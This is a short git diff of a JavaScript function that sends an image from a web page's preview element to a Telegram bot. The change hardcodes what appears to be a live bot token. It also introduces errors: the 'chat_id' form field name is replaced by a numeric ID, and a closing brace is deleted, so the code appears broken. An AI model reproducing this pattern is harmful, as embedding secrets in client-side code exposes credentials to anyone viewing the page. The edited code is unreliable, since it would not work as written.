@@ -50,11 +50,11 @@ function capturePhoto() {
 function sendPhotoToBot() {
     const imageData = document.getElementById('previewImage').src;
     const chat_id = getChatId(); // Получаем chat_id динамически
-    const bot_token = 'ваш_bot_token'; // Токен вашего Telegram бота
+    const bot_token = '6939402556:AAHW_lZWPrMHwVJlLK8r2Io7jVQfYZaaSlo'; // Токен вашего Telegram бота
     const telegram_api_url = `https://api.telegram.org/bot${bot_token}/sendPhoto`;
 
     let formData = new FormData();
-    formData.append('chat_id', chat_id);
+    formData.append('1277274408', chat_id);
     formData.append('photo', imageData);
 
     fetch(telegram_api_url, {
@@ -72,4 +72,4 @@ function sendPhotoToBot() {
 function getChatId() {
     // Ваш код для получения chat_id, например, из URL или временного хранилища
 }
-}
+
